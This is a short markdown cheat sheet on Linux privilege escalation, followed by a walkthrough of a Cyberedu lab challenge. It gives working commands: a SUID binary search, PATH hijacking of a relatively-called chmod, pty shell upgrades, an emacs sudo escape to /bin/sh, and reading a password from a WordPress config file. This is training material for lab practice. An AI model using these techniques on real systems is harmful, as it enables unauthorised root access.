<style>
    code{
    background-color: rgba(245, 178, 34, 0.5)
    }
</style>
# PRIVILEGE ESCALATION FOR BEGGINERS

1. Check if you can crack a password using `johntheripper`
2. Check the `sudo permissions` with: `sudo -l`
3. Check the `suid executables` and their functions with strings or other methods. ` find / -perm -4000 2>/dev/null `
4. If a `method calls an executable without the absolute path`, the `PATH ORDER` can be modified. 
> ex: chmod instead of /bin/chmod 

    -> that means that you can just add a chmod file in the tmp/.secret directory, add the tmp/.secret directory in the path before any other paths. So then this will be executed first -> it will execute /bin/bash for example.

### Tips n Tricks
    
    To create a nice shell do: python3 -c 'import pty; pty.spawn("/bin/bash")'

#
    Sudo -l tells you what commands can the currently logged in user execute as WHICH OTHER USER
    ex: user2 can execute vim as user3

#
    Create a fully interactive shell
    python3 -c 'import pty; pty.spawn("/bin/bash")'

    (inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
#

### For privilege-escalation v2 on Cyberedu:

- Find the password to a user in the wp config file.
- Then log in as that user
- Do `sudo -l`, find that meriot can execute emacs as tony
Search the exploit for emacs: sudo -u tony emacs -Q -nw --eval '(term "/bin/sh")'
- Then you have shell

- For the last one you just look for the `suid binaries` and find the binary fix, with the same issue that chmod is put with relative path so by manipulating the PATH variables you can actually execute your chmod executable first, that can do even /bin/bash with that specified user, escalating privileges.

